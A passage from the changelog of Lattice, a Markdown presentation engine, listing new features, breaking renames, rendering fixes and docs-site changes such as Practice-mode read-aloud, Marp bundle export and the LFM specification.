  UI half of the worked-exemplars work above: the 45 decks are now reachable from
  the app, not just the repo.

- **A features page (`/features`).** A scannable, segmented capability catalog —
  the comparison page covers "vs. them"; this is the "just us" reference. Built
  as a single catalog table (the comparison matrix's styling, minus the
  competitor columns) with a Feature/Details split, grouped into Authoring, the
  53-layout field-native catalog (by bucket), Theming & brand, Output &
  rendering, Deck-as-code, AI authoring, and Ownership. Marketing prose stays on
  the landing; this page is the reference. Linked from the primary nav and footer.

- **Practice mode is now touch-first, with a guided intro, swipe navigation, and
  autoplay.** Opening a rehearsal lands on a calm **ready** pre-roll — the clock
  holds at 0:00 behind a Start button until you begin — and a first-time
  **walkthrough** (the shared `driver.js` guided tour, remembered after one view)
  introduces the controls; replay it from the **?**. The stage advances by
  horizontal **swipe** (touch/pen) and by auto-hiding overlay arrows that reveal
  on pointer-move / tap / keyboard-focus and fade while presenting — one gesture
  language on mobile, tablet, and desktop. **Autoplay** is a top-bar **Auto**
  toggle: once you start, it dwells each slide for the planner's per-slide target
  (reading-pace + role-weighted, AI-refined when a model is wired) then advances,
  stopping cleanly at the last slide. Keyboard rehearsal is unchanged, with `p`
  to toggle Auto. A **full-screen** toggle (auto-entered on Start, `Esc` to leave)
  reclaims the browser chrome, and on phones held **landscape** the bar + HUD
  compact so the 16:9 stage fills the freed height instead of a letterboxed sliver.
- **The Form composition model is now a first-class, engine-read manifest
  (`lib/forms/`).** Frame + Cell + Tile each get a folder-per-noun catalog
  (`frame/`, `tile/`, `cell/`, `schema/`) with a loader (`lib/forms/index.js`)
  mirroring the component-manifest infrastructure, generated into a machine
  catalog at `dist/docs/forms.json` (new `npm run docs:forms` / `:check`, wired
  into `npm run build`). The engine's `FORM_TOGGLE_SKIP` (the chrome-exempt
  sovereign Frames) is now **derived from the frame manifests** instead of a
  hardcoded array, so adding a sovereign Frame folder auto-updates the toggle's
  skip behaviour — the Open/Closed win (the derived set is behaviour-identical
  to the historical one). See `design/forms.md` §11 and
  `engineering/decisions/2026-06-15-form-implementation.md` §6.

- **A value-demonstrating Form gallery (`design/forms.gallery.md` + committed
  PDF) and a per-feature demo deck (`examples/form.md`).** The gallery makes the
  case for the model — author one block of Tiles, let a consumer select a Frame
  and the same Tiles re-flow — and proves the chart-collapse fix (a full-size
  `piechart donut` and `radar` inside the chrome), the footer-Cell contract (the
  rail no longer collides with the footer text), the masthead bay (`meta:` + a
  `confidential` status chip), the watermark Tile, and per-Cell `fill` discipline
  (`fill-center` vs `fill-anchor` on the same Tile). The payoff sequence carries
  one block of content under `form: standard`, `form: minimal`, and a sovereign
  `split-panel` Frame. See `design/forms.md`. An honest, sourced read on how
  Lattice stacks up against the field: AI generators (Gamma, Beautiful.ai,
  Decktopus, Presentations.ai, Plus AI, MagicSlides, SlidesAI), office suites
  (PowerPoint + Copilot, Google Slides + Gemini, Keynote), code engines (Marp,
  reveal.js, Slidev, Beamer, Quarto, Spectacle), and design/collab tools (Pitch,
  Canva, Figma Slides). It credits each rival's real strengths, makes the
  deterministic/boardroom case with a capability matrix and a cited evidence
  section, answers "isn't this just Marp?", states the bring-your-own-model
  stance (OpenRouter, your key/credits, default Claude Sonnet, plus the
  deterministic-first/prompt-caching/budget-cap cost controls), and concedes
  where Lattice is the wrong tool. Linked from the primary nav and footer;
  research source-of-truth in `engineering/decisions/2026-06-14-competitive-analysis.md`.

- **The LFM standard is now published on the docs site.** The owned standards
  that previously lived only as repo files (`spec/LFM-1.0.md`, `spec/diagnostics.md`)
  now have a web home: a new **Specification** section taught in two registers —
  a plain-words *Understanding LFM* front door for everyone, and the normative
  *LFM 1.0* spec + *Diagnostic Protocol* for implementers. The normative pages
  are generated from `spec/*.md` by `tools/build-spec-docs.js` (npm `docs:spec`,
  with a `docs:spec:check` freshness gate wired into the build), so the site can
  never drift from the canonical spec; repo-relative links are rewritten to site
  routes / GitHub source automatically.
- **Read-aloud in Practice mode — one consistent neural voice, never the
  per-device `speechSynthesis` lottery.** The rehearsal HUD gains a play control
  that narrates each slide's *speaker note* (falling back to the prose snippet),
  with real pause/resume — and barging in cleanly when you navigate. It runs on
  a `VoiceModel` voice ladder (twin of the architect model
  ladder): **OpenRouter audio** (`gpt-audio-mini`, spoken via the
  chat-completions audio modality — OpenRouter has no `/audio/speech` TTS route)
  when you've connected OpenRouter — reusing the same browser OAuth key,
  sub-cent/slide on your own credit, $0 to the project — falling back to
  **Kokoro-82M** (Apache-2.0, ONNX)
  summoned in-browser for a free, offline, no-account voice. `speechSynthesis`
  is a dev-only stand-in, never production. **Settings → Voice** configures it:
  the voice source (Auto · Cloud · On-device · Off), a curated picker of cloud
  and Kokoro voices each with a **play-sample** button, and the on-device
  download/remove. **The on-device (Kokoro) voice is desktop-only** — on a
  phone/tablet the ~80 MB onnxruntime load is the unreliable, memory-heavy path on
  Safari/iOS, so it isn't offered there; **mobile uses the cloud voice**, which
  needs no download. (The Settings Voice tab and the Practice control both reflect
  this: no download UI or On-device source on a coarse pointer, and a cloud-needed
  prompt in its place.) Playback uses **WebAudio** (an `AudioContext` resumed on
  the tap) so **iOS/Safari** permits the audio synthesized/fetched a moment later —
  it otherwise blocks programmatic playback after the async gap ("downloaded but
  silent") — and so it ignores the hardware ringer switch; on desktop the Kokoro
  model loads in a **same-origin worker** (off the main thread). The Practice
  button also reflects a **cached-but-not-loaded** model instead of a misleading
  "download" glyph. See `engineering/decisions/2026-06-14-read-aloud-kokoro.md`.
- **The Drawing Board now shows export progress and an error toast.** A
  one-click PDF/PPTX export rasterizes every slide in the browser — seconds to
  tens of seconds on a phone — but the only feedback was low-contrast text in
  the *preview* pane header, invisible from the editor pane where Export is
  tapped (so on mobile a slow export read as "nothing happened / it's broken").
  Export now raises a floating, pane-independent progress card with a
  determinate bar (slide _i_ of _N_ for PDF/PPTX, indeterminate for the Marp
  bundle's asset fetch + `.pptx` assembly), and a **failure surfaces as a toast
  with a one-tap Retry** instead of only a buried status line. The inline
  status still updates for desktop users who watch it. No change to exported
  file content. Fixes the "iOS export doesn't seem to work" report (it works —
  it was the missing feedback). See `docs/src/playground/drawing-board-export.js`
  and `docs/src/pages/drawing-board.astro`.
- **Export to Marp from the Drawing Board (the "Marp bundle" export).** The
  Export menu gains a **Marp bundle (.zip)** item that produces the same
  portable bundle as `npm run export:marp`, assembled in the browser: it bakes
  the slide splits into literal `---`, fetches the (minified) engine, stylesheet,
  runtime, mermaid + the deck's palette, and zips them with a `marp.config.cjs`
  + README via JSZip. The CLI and the browser share one pure spec
  (`lib/core/marp-bundle.js`) + split baker so they can't drift. The bundle now
  ships **minified** JS/CSS under the canonical names (emulator 1.5 MB → 360 KB)
  and DEFLATE-compresses to ~1.2 MB. Completes
  `engineering/decisions/2026-06-13-export-to-marp.md` (P3).
- **The bundled CLI now exports PPTX and PNG natively — no marp-cli.**
  `lattice deck.md out.pptx` writes an image-per-slide PowerPoint, and
  `lattice deck.md out.png` writes one PNG per slide (`out.001.png`, …). The
  output extension picks the format; `.pdf` still produces the vector,
  selectable-text PDF. PPTX/PNG rasterize from the same headless-Chromium render
  the PDF uses, so all formats are pixel-identical. PPTX assembly uses
  `pptxgenjs` (the same library and image-per-slide model as the Drawing Board's
  browser exporter), so the CLI and web paths emit comparable decks. This is the
  owned, marp-free export path; editable PPTX (marp's LibreOffice variant) is
  intentionally not included.

### Changed

- **Practice mode gets an immersive portrait layout.** On a phone/tablet held
  **portrait**, the rehearsal stage fills the viewport and the chrome floats as
  scrim overlays in the slide's natural top/bottom letterbox (covering no slide
  content): the top bar + edge arrows auto-hide for a clean slide and a tap
  reveals them, while the bottom timing readout stays put. Landscape keeps the
  compact grid (its letterbox is on the sides). A 16:9 slide is still a
  horizontal strip in portrait — this lifts the chrome off it and makes it
  full-width; the screen fills edge-to-edge in landscape.

- **Docs site now prefetches resources to make the in-browser experience feel
  instant.** Two layers, each matched to its cost. (1) Astro's built-in link
  prefetching is on site-wide (`hover` strategy): every internal link warms its
  destination HTML when you point at it. (2) The one heavy asset — the ~554KB-gz
  render engine bundle (`lattice-playground.js`) — gets a connection-first
  warming policy (`docs/src/lib/prefetch-engine.ts`): one decision function,
  identical on desktop/tablet/mobile, that drops a `<link rel="prefetch">` so the
  bundle is cached before a surface needs it. Capability drives it — `4g`/fast →
  eager (on the landing funnel) or on app-link intent elsewhere; `3g` → intent
  only; `2g`/`slow-2g`/`Save-Data`/`prefers-reduced-data` → off; unknown
  connection (Safari/Firefox have no Network Information API) falls back to the
  viewport as a proxy. Plus a `preconnect` to the Google Fonts hosts on every
  page so the webfont round-trip doesn't wait on the render-blocking `@import`.
  No change to what renders — purely a perceived-latency optimization.

- **Practice mode's per-slide time is promoted, and the Prev/Next buttons are
  gone.** The bottom HUD used to bury the slide's budget in a ~0.72rem grey
  "target 0:45" footnote behind two nav buttons. It's now a calm three-zone
  readout — **elapsed** (dominant) · **this slide** · **pace** — where "this
  slide" is a near-clock-weight countdown of the time *left* on the slide that
  flips warm the moment you run over. Navigation moved to swipe + the overlay
  arrows + keys (see Added), so the strip is one legible readout, not a crowd.
  The sliding section spine up top is unchanged.

- **Docs-site live previews now fetch the minified engine runtime + CSS.** The
  Playground, Drawing Board, and every component specimen inject the engine
  runtime and engine stylesheet into their preview iframes; the sync step
  (`docs/scripts/sync-playground-assets.mjs`) was staging the *readable* builds.
  It now stages the already-built minified variants (`lattice-runtime.min.js`,
  `lattice.min.css`) under the same content-hashed URLs — runtime ~1.5MB → 300KB,
  engine CSS ~727KB → 362KB per preview (~2.3MB → ~0.66MB total), with no change
  to what renders. The readable `dist/lattice-runtime.js` / `dist/lattice.css`
  remain the devtools/debug artifacts; the minified builds already backed the
  Export-to-Marp path, so this just shares them.
- **Breaking: the `islands` composition feature is renamed to `form`** — the
  canonical Form / Frame / Cell / Tile vocabulary (`design/forms.md`). The
  deck/section toggle `islands: on | minimal | off` becomes
  `form: standard | minimal | off` (`standard`/`true`/`on`/`yes` all map to
  `standard` — the seam for author-selected Frames); per-slide `islands` /
  `no-islands` classes become `form` / `no-form`; CSS hooks `.isl-*` →
  `.cell-*` / `.tile-*`, custom properties `--isl-*` → `--frame-*` / `--cell-*`.
  `masthead` / `progress` / `watermark` are kept (surviving Cell/Tile concepts).
  Landed lock-step across all three render paths (HARD RULE 1), pixel-identical
  (a control deck renders AE=0 before/after). See
  `engineering/decisions/2026-06-15-form-implementation.md` §7.

- **Per-Cell `fill` discipline on the stage** — `fill-center`, `fill-anchor`,
  and `fill-optical` opt a `form` slide's stage into a board-style content
  distribution instead of the default top-anchored flow (`design/forms.md` §5).

- **Chart spine tokens (`--chart-spine` / `-w` / `-h`) moved to
  `section.word-cloud`.** They lived on the shared `section.chart-frame` block,
  but since the four keyed charts went SVG-native (#240) only `word-cloud` still
  draws a CSS spine from them — so it now owns them. Rendering is unchanged; only
  a consumer overriding these (undocumented) tokens at `section.chart-frame` level
  would need to retarget `section.word-cloud`.

- **The `math canvas` plot fence is now ` ```functionplot ` (was ` ```latticeplot `).**
  The fence is renamed after the library that renders it (function-plot) — the
  same convention as ` ```mermaid ` and the `$$…$$` KaTeX math the same
  component already uses. Lattice never owned the plot config (the fence body is
  function-plot's schema verbatim); the old name implied an abstraction that
  doesn't exist, so it was corrected for honesty. Rendered output is unchanged.
  Internal: the placeholder is now `<div class="functionplot">` (was
  `latticeplot`), and the LFM spec (`spec/LFM-1.0.md` §3.3) documents fences as
  renderer-named, third-party sub-languages. See
  `engineering/decisions/2026-06-13-lfm-standard.md`.

### Deprecated

- **The ` ```latticeplot ` fence is deprecated — use ` ```functionplot `.** It is
  retained as a working alias for one release and will be removed in a future
  major version. Existing decks keep rendering unchanged in the meantime.

### Fixed

- **Slides render fully styled again in the playground, Drawing Board, and every
  browser-engine surface.** The marp purge switched those surfaces from the
  unminified palettes to the **minified** `dist/themes/*.min.css`, whose base
  import is written without a space (`@import"lattice"`). The engine's
  base-inlining regexes required `\s+` after `@import`, so the minified import
  never matched — every palette collapsed to scaffold-only CSS (~7 KB) and slides
  rendered as unstyled raw markup (no theme, no component layouts). Relaxed
  `THEME_IMPORT_RE` / `URL_IMPORT_RE` (`lib/engine/css.js`) and
  `THEME_NAME_IMPORT_RE` (`lib/engine/themes.js`) to `\s*` so minified and
  source palettes inline identically. The CLI/PDF path was unaffected (it
  registers the source themes); the regression was browser-only. Guarded by a
  sweep over the real minified dist palettes in `test/unit/engine/engine.test.js`.

- **`kpi` and `math` eyebrows now use the lint-safe inline-code form, not a
  heading.** Both manifests authored the eyebrow as an `### h3` above the `## h2`
  title — a heading-order violation (and, in `kpi`, two adjacent headings with no
  blank line, which isn't valid markdown). The eyebrow convention moved to an
  inline-code paragraph long ago (`base.modifiers.css` — "not a heading, so it
  never violates heading-order rules"); `kpi` and `math` were the last holdouts.
  Converted every skeleton / sample / variant sample (and `math`'s hand-authored
  gallery) to `` `Eyebrow` `` paragraphs, and repointed the eyebrow CSS + slot
  selectors. Renders identically (mono, tracked, uppercase); the authoring is now
  valid markdown that matches what the CSS supports.

- **The export-to-Marp bundle's `npm install` no longer 404s.** The generated
  `package.json` listed `@slidewright/lattice` as a dependency, but that package
  is unpublished — so a recipient following the README's marp-cli route
  (`npm install` → `npm run pdf`) hit `E404` and never even got marp-cli. The
  engine ships pre-bundled as `dist/lattice-emulator.js` (the README's
  zero-install primary route), so the dependency was both unnecessary and
  breaking; the bundle now pins only `@marp-team/marp-cli`.

- **`compare-prose` verdict variants now render — `chosen` / `decision` /
  `vertical` / `rejected` were silent no-ops.** Their CSS targeted a
  `.compare-prose-inner .card` DOM that no render path emits, so they rendered
  identically to plain `compare-prose`. Re-scoped to the live
  `> :is(ul,ol) > li` structure (the same DOM the working `transition` variant
  uses): `chosen` tints the winner card, `rejected` dims + strikes the dropped
  card, `decision` does both plus a labelled **DECISION** chevron, `vertical`
  stacks the two cards. The cross-cutting `mirror` modifier on `compare-prose`
  was dead for the same reason and is fixed alongside. Surfaced by the
  manifest-vs-CSS audit (`engineering/decisions/2026-06-15-manifest-css-audit.md`).
- **`redline` `split` / `stacked` / `three-col` show their OLD / NEW labels
  again.** A specificity regression in the central blockquote eyebrow rule had
  been overriding them with "KEY INSIGHT". The eyebrow rule now excludes
  `redline` (`:not(.redline)`), so a legal diff never inherits "KEY INSIGHT" and
  the variants' OLD/NEW labels apply unopposed.
- **`citation-card` samples no longer render an empty action item.** The
  `pull-quote` variant hides any gloss line without a bold lead, and the action
  box only fires on a bold-led item — but the skeleton/samples authored
  `- What we must do.` plain, so the action vanished (pull-quote) or lost its
  chrome (default). The samples now bold the action lead per the slot contract.
- **Component manifest descriptions corrected to match what the CSS actually
  renders.** A full manifest-vs-CSS audit found ~30 drifted claims; the prose is
  now aligned. Highlights: `checklist` `[ ]` is a hollow ring (not an "x");
  `title` eyebrow renders *above* the h1 (CSS reorders it); `kpi` pills are
  coloured by row position, not by recognised text; `journey` swimlane dots are
  *coloured* by mood, not sized; `timeline-list` is a horizontal spine with
  stacked items (not left/middle/right); `split-panel watermark` rubric is an
  `h3`; `roadmap` `horizons`/`milestones`, `piechart` donut, `obligation-matrix`
  `asymmetric`, `stats`, and `image museum` captions reworded to the real
  behaviour; several stale CSS header comments fixed to match. See
  `engineering/decisions/2026-06-15-manifest-css-audit.md`.
- **Worked exemplar decks: corrected four copy-paste authoring bugs.** The 45
  worked exemplars (`exemplars/**`) carried authoring forms that lint cannot
  catch but that degrade the render: (1) `list-steps` slides wrote each step as
  an inline `N. Title — body` line, which collapses the title/body typographic
  split into one bold blob — converted to the canonical `N. Title` / nested
  `- body` form; (2) `list-tabular` slides buried the headline figure in the
  description prose, leaving the right-hand meta column empty — lifted the figure
  to the inline-code meta on the name line; (3) `quote` slides printed a literal
  "Attribution" label because the attribution line read `Attribution — Name` —
  the component renders that verbatim, so it now reads `— Name` to match the
  gallery; (4) `kpi` slides authored the eyebrow as an `### ` h3 — #362 retired
  that in favour of the lint-safe inline-code paragraph, so all 38 are now
  `` `Eyebrow` `` paragraphs matching the corrected component. Also removed
  unsupported `` `Owner:` `` pills from a `list-steps` slide (the component has
  no pill slot).
- **`quote` component docs: the copyable example showed the wrong attribution
  form.** `quote.docs.md` demonstrated `Attribution — Person, Role`; the
  component renders that literally (no label is injected), so the example is now
  `— Person, Role`, matching the gallery. This was the source of the exemplar
  bug above.

- **Landing page no longer claims "Fifty-eight layouts."** Two marketing
  strings on the landing said 58; the catalog ships 53. Corrected to match the
  canonical count (`dist/docs/components.json`).

- **Overflow signalling split into authoring vs. delivery — and made
  accessible.** The loud signal (the red ring + a new labelled **"OVERFLOWS"
  corner tab** — text, not colour alone, fixing WCAG 1.4.1) now appears **only in
  the live preview** (VS Code / Drawing Board / playground), where the author is
  fixing. **Exported PDFs no longer burn in the ring** — a red box in front of a
  board is worse than the subtle clipping `overflow:hidden` already does, so the
  export stays clean **and warns the author in the console, listing the exact
  overflowing pages** to fix before delivering. (Previously the ring was burned
  into the PDF.) The export path enforces this two ways: it strips the
  `.overflow` class before printing, **and** drops the live-preview runtime
  (`lattice-runtime.js`) `<script>` tag from the export HTML — without that, a
  deck which embeds the runtime (as the galleries do) would have its
  MutationObserver / ResizeObserver / rAF watcher re-paint the ring and tab
  mid-print. The runtime is a documented no-op for the deliverable (Mermaid is
  pre-rendered to SVG; styling is the embedded `lattice.css`), and dropping the
  tag — rather than intercepting the request per page load — keeps every render
  fast (request interception slowed the 53-component invariants suite enough to
  time out in CI).

- **The Form (`form:`, formerly `islands:`) no longer paints chrome over
  content.** Three real defects are fixed at the root by making the masthead /
  stage / footer **Cells** reserve their boxes (`design/forms.md` §6):
  - **Masthead Cell.** An in-flow, content-height band: the hairline sits
    directly under the title (no dead space under a one-line title; the band
    grows for a two-line title). Components flow in the real stage below it; the
    footer is reserved via `padding-bottom`.
  - **Charts no longer collapse OR clip.** A `piechart donut` (and `radar`,
    `map`, the cohort `quadrant`) under the Form failed two ways: on a roomy
    slide it collapsed to a thumbnail (the `cqh`-against-`flex:1`-figure chain
    can't grow a replaced `<svg>` in print media); on a *dense* slide (2-line
    subtitle + caption) an interim `cqi`-height fix overflowed the squeezed
    `.chart-body` and `overflow:hidden` clipped the ring + legend to a fragment.
    Charts now size to the **`.chart-body` content box** (`container-type:size`
    on the body, `display:contents` on the figure, svg `height:100cqh`), which
    fills the stage reliably in the print context and tracks every chrome combo
    (0/1/2-line subtitle ± caption) — full ring, all legend rows, no clip, HD
    and 4K alike. Scoped to `section.form`. See
    `engineering/decisions/2026-06-15-form-chart-clip.md`.
  - **Footer no longer collides with the progress rail.** The footer Cell
    reserves three non-overlapping horizontal zones (footer-left ·
    progress-centre · pagination-right); footer text yields the reserved centre
    so it can never run through the section label.
  Body overflow is hard-clipped at the stage (`overflow: hidden`) so it can't
  bleed across the chrome Cells; the overflow warning ring still fires. (A soft
  content "fade" at the cut was considered and rejected — it's a scrollable-web
  idiom, false on a fixed page, and hides authored content; see `design/forms.md`
  §6.) All `section.form`-scoped → non-Form (boardroom) decks are
  byte-identical; resolution-invariant (all `cqi/cqh`, no fixed px). Completes
  Defect 1 of
  `engineering/decisions/2026-06-13-islands-sketch-density-collisions.md`
  (the masthead-reservation note's "M1 fixed the donut" claim was stale — the
  donut collapse was still live and is fixed here); see
  `engineering/decisions/2026-06-15-form-implementation.md`.

### Added

- **Export a single chart as a standalone `.svg`.** The four keyed charts
  (pie/radar/map/cohort quadrant) render the diagram, spine, and key as one
  `<svg>` — now you can lift one out of a deck as a self-contained file that
  opens correctly anywhere. `node tools/export-chart-svg.js <deck.md> [--slide N]
  [--mode dark] [-o out.svg]` (or `--all`) renders through the same engine the
  Drawing Board uses, flattens the theme colours to literals so the detached file
  needs no stylesheet, and embeds the fonts it uses as data-URIs. In the Drawing
  Board the same core powers a **"Chart SVG"** entry in the Export menu that
  appears **only when the cursor's slide has a chart**, exporting that one. See
  `chart-family.docs.md` § "Standalone export".

- **Export to Marp — a portable deck bundle (`npm run export:marp`).** Exports a
  deck as a self-contained directory or `.zip` for use outside Lattice: the
  `.md` with its `split: headings` boundaries **baked into literal `---`** (so it
  divides correctly in any Marp tool — incl. the marp-vscode preview — with no
  Lattice plugin), the engine stylesheet + the deck's palette, localized image
  assets, a bundled zero-install renderer, a `marp-cli` config, and a README.
  The baker (`lib/core/bake-splits.js`) shares its boundary computation with the
  live divider (`lib/core/heading-split-core.js`), so a baked deck is proven to
  produce the identical slides. The bundle also packs `mermaid` + the Lattice
  browser runtime and appends two `<script>` tags to the deck, so an exported
  **HTML** opened in a browser renders Mermaid/chart diagrams **and** structural
  components (card grids, split panels, islands, badges) client-side. Full
  fidelity also via the bundled engine / `marp-cli`; stock marp-core (no scripts)
  renders splits + styling + raw fences. See
  `engineering/decisions/2026-06-13-export-to-marp.md`.
- **The Drawing Board Coach can now _fix_ a flagged slide, not just explain it
  — when a capable model is connected.** Each judgement finding (a wall-of-text
  slide, a label-only title — the rules a rule can't mechanically rewrite) grows
  a **Fix** button next to *How to fix*. It asks the model to rewrite just that
  slide, shows the change as a reviewable ± diff, and applies nothing until you
  click **Apply** — at which point the deterministic engine re-scores (the model
  never owns correctness). It reuses the same EDIT-BLOCK protocol and diff card
  as Converse, respects the session budget cap, and caches the prompt where the
  provider supports it. The button only appears on a strong tier (cloud /
  WebLLM); with no model, the deterministic *How to fix* guidance and the exact
  mechanical *Apply fix* are unchanged — the floor loses nothing. The button also
  tracks the live tier — connect or disconnect a model mid-session and Fix
  appears or hides immediately (no deck edit needed). New module
  `architect-fix.js` (pure, headless-tested). See
  `engineering/decisions/2026-06-08-drawing-board-coach-vs-converse.md`.
- **The Architect is now grounded in the presentation canon (cloud tier).** A
  distilled principle pack — Minto, Duarte, Knaflic, Reynolds, and the
  common-pitfalls literature, as our own terse, attributed synthesis of the
  public *frameworks* — feeds the model the *why* behind each finding and how the
  field says to fix it. The cards matching a deck's findings ride the Converse
  prompt (so advice is canon-grounded, not generic), and the one card for a
  finding rides its **Fix** rewrite (so the rewrite follows the principle). New
  pure module `presentation-canon.js` (headless-tested); cloud-tier only, riding
  the per-turn tail so it never invalidates the cached primer. See
  `engineering/decisions/2026-06-13-coach-canon-knowledge-pack.md`.
- **Speaker notes — a non-directive HTML comment is that slide's note
  (Marp-faithful, LFM §3.5).** Any `<!-- … -->` that isn't a directive or a
  tooling pragma (`markdownlint`/`prettier`) becomes the slide's speaker note,
  matching Marp exactly. The emulator now embeds each note as a per-page **PDF
  text annotation** and a hidden **HTML presenter-notes channel**
  (`<aside class="lattice-notes">`), and `--notes` writes a plaintext
  `.notes.txt` sidecar. The PDF annotation is **hidden by default** — embedded
  and tool-extractable, but no icon marks the boardroom slide and it never
  prints; `--notes-icon` exposes a clickable sticky note instead. Extraction is
  single-sourced in `lib/authoring/notes-core.js` and run over the rendered
  slides, so the note index tracks the slide split (including `split: headings`);
  a parity test pins its keep/drop boundary to marp-core's own comment
  collection so the render paths can't drift (HARD RULE #1). Demo:
  `examples/speaker-notes.md`.
- **Breaking: decks divide on headings by default — the `split:` front-matter
  key.** A new deck-wide key chooses how the body splits into slides. The
  default is now **`split: headings`**: the first `#` is the lead slide and
  every subsequent `##` opens a new one, so a deck reads like a document with no
  separators to forget. Set **`split: rule`** to keep the classic
  separators-only behaviour (split only on `---`). The headings divider is
  **eyebrow-aware** — a slide's `<!-- _class -->` directive and its eyebrow
  (a `p` whose only child is one inline-`code` span), written above the title,
  are pulled onto that slide instead of orphaning onto the previous one — and
  **hybrid**: an explicit `---` still forces a break. Implemented as one shared
  `hr`-injection plugin so the Lattice engine, marp-cli, and the playground
  split identically (HARD RULE #1), and **slide-count-identical on every classic
  `---`-separated deck**, so existing decks are unaffected. Settable from the
  Drawing Board's Deck Setup panel; an unknown value warns (`unknown-split`) via
  the deck linter. Demo: `examples/split-headings.md`. Note: stock Marp (incl.
  the marp-vscode preview) doesn't run the divider — Marp portability is served
  by a planned Export-to-Marp bundle; the Lattice engine is the source of truth.
- **LFM — Lattice-Flavored Markdown, named and specified.** Lattice's authoring
  dialect now has a name and a versioned spec (`LFM 1.0-draft`) under `spec/`.
  LFM is defined as a **profile of Markdown** (`CommonMark + GFM task lists + the
  Lattice extension set`), with **graceful degradation** as its governing rule:
  every extension renders as readable Markdown in an LFM-unaware host. Ships
  `spec/LFM-1.0.md` — the extension set, three conformance levels, the
  degradation table (including the one known non-GFM-clean construct, the
  `[-]`/`[/]` state markers), conformance-test shapes per level, security
  considerations for the embedded sub-language fences, governance under a
  **CC-BY-4.0** spec license, and a worked end-to-end example. Also ships
  `spec/diagnostics.md` (the LFM Diagnostic Protocol — the stable finding shape
  and frozen rule registry the deck linter already emits) and a new generated
  artifact `dist/docs/grammar.json`: the machine-readable per-component grammar
  (each `_class` token, its slots + required slots, the modifiers it accepts,
  and the shared state-marker / fence sub-grammars), projected from the
  manifests by `tools/build-docs-portal.js` alongside `components.json`.
  Rationale and the embedding endgame:
  `engineering/decisions/2026-06-13-lfm-standard.md`.
- **Contracts + Layout-swapping — the `inventory` contract (first slice).** A new
  sibling tier (`lib/contracts/`) makes the **Function** layer first-class: a
  *contract* names a Purpose's content shape (slots + cardinalities + one
  canonical DOM + samples), and *conforming Layouts* style that DOM, so an author
  swaps the look for the **same Content** with one class — pure CSS, no
  re-author. Ships the `inventory` contract and four conforming, palette-blind
  Layouts — `layout-ledger`, `layout-cards`, `layout-timeline`,
  `layout-editorial` — bundled into `lattice.css` and recognised by the deck
  linter. Demo: `examples/contract-inventory.md` (one Content, four Layouts). The
  base KEY INSIGHT rule now excludes the `layout-*` tier (contract Layouts own
  their blockquote; pixel-identical for existing decks). Adds the two-register
  vocabulary (`design-system.md §2.5`) the model uses. See
  `engineering/decisions/2026-06-12-contracts-layout-swapping.md`.
- **The deck-setup front-matter panel is now universal — in the Playground and
  the Workbench too, not just the Drawing Board.** The config panel
  (`docs/src/playground/deck-config.js`, relocated from `drawing-board-config.js`)
  gained a `fields` profile so each surface shows the right subset: the
  Playground gets a **Deck setup** drawer (everything except `theme:`, which its
  palette picker owns); the Workbench's Theme + Layout Studios get a state-backed
  **Preview setup** that applies a finish / size / islands to the specimen or
  skeleton preview behind the scenes — so you can audit a theme or component
  under `sketch` without it leaking into the saved asset. Sensible defaults
  (boardroom / clean), full power on tap. Editor front-matter autocomplete for
  `finish:` rides along in the Playground.
- **New `finish:` front-matter key — apply a finish deck-wide by name.**
  `finish:` is a Lattice front-matter extension (orthogonal to `theme:`) that
  names the whole-deck finish in one readable token and propagates it to every
  slide, composing with any per-slide `_class:` (so `finish: sketch` +
  `_class: cards-grid` → `class="cards-grid sketch"`). The open register
  (`lib/core/resolve-finish.js`) ships three values: `boardroom` (the baseline,
  also the omitted default), `sketch`, and `sketch-clean` (hand headings +
  boxes, clean body for dense slides). All three render paths read it, and
  `npm run lint:deck` flags an unrecognized value as an `unknown-finish` warning
  so a typo surfaces instead of silently rendering the baseline. Prefer it over
  `class: sketch` when the intent is "this whole deck is sketch."
- **The Drawing Board surfaces `finish:` in both the deck-setup drawer and
  editor autocomplete.** The setup drawer gains a **Finish** picker (Boardroom /
  Sketch / Sketch · clean body) next to the theme control — picking Boardroom
  clears the key, since it's the baseline — and typing `finish:` in the front
  matter completes the register names from the same vocabulary the linter
  validates against, so the in-browser editor and the deck-lint stay in lockstep.

- **Guided tours for the docs workspaces.** The Playground, Workbench, and
  Drawing Board each ship a context-sensitive walkthrough (built on driver.js,
  MIT) that auto-runs once on a first visit and replays from a "Tour" button in
  the topbar. Tours are mobile-aware — they switch the active pane/tab to bring
  each step's target on screen — and palette-blind, themed entirely from the
  design tokens. A global **Guided tours** on/off toggle in the Drawing Board's
  Workspace settings governs all three surfaces and takes effect live. Tours
  activate on the production site only — never local dev or Cloudflare PR
  previews (gated build-time via `docs/src/lib/deploy-env.mjs`).

### Changed

- **The docs zone now reads as part of one website, not a bolted-on subsite.**
  The Starlight docs header is reskinned into the same topbar the landing,
  playground, and component pages carry — brand, the full global nav (incl.
  Workbench + GitHub), search, a palette `<select>`, and a light/dark toggle —
  wired to the shared `lattice-docs-palette` / `lattice-docs-mode` keys so a
  palette/mode chosen anywhere on the site carries across the jump. Starlight's
  `--sl-color-*` surface is remapped onto the site palette tokens, so **all 14
  palettes re-theme the whole docs chrome** (header, sidebar, prose, search
  dialog) in light and dark, exactly like the rest of the site. Navigation no
  longer dead-ends at the logo: on tablet/mobile the global links lead the
  sidebar/hamburger menu (Home … GitHub), so you can always get back out.
  Implemented as four small Starlight component overrides (`Header`,
  `ThemeProvider`, `Sidebar`, `MobileMenuFooter`) plus the token remap in
  `docs/src/styles/lattice.css`; no engine or deck behaviour changes.
  **Code blocks** join the theming too: the syntax highlighter switches from
  the default saturated night-owl to the restrained, low-saturation Vitesse
  pair so code sits calmly inside any palette (instead of a cool blue fighting
  the warm themes), and the block's interactive accents — focus ring, copy
  button, active-tab indicator, selection, scrollbar — bind to the palette
  accent. The frame already tracked the palette via Starlight's UI theme
  colours. The topbar's chrome glyphs (menu / moon / sun) now live in one
  shared `chrome-icons.css` imported by both the standalone pages and the docs
  skin (so the two topbars can't drift), and the docs mobile menu button is
  restyled to the same bordered-square toggle the rest of the site uses.
  **The site navigation is now one coherent taxonomy.** The primary nav lives
  in a single shared source (`docs/src/lib/nav.mjs`) consumed by every surface
  — the landing/playground/drawing-board/workbench topbars, the component
  topbar, and the docs header + mobile sidebar — so it can't drift. The two
  overlapping doc links (`Get started` + `Guides`) collapse into one **Docs**
  entry that lands on the Overview hub (now carding into Principles, What is
  Lattice?, Get started, the guides, and Components); the apps (Playground,
  Drawing Board, Workbench) and Components stay as their own entries. The docs
  sidebar is now docs-only — `Introduction` (Overview · What is Lattice? ·
  **Principles** · The story) → `Get started` → `Guides` — with the duplicate
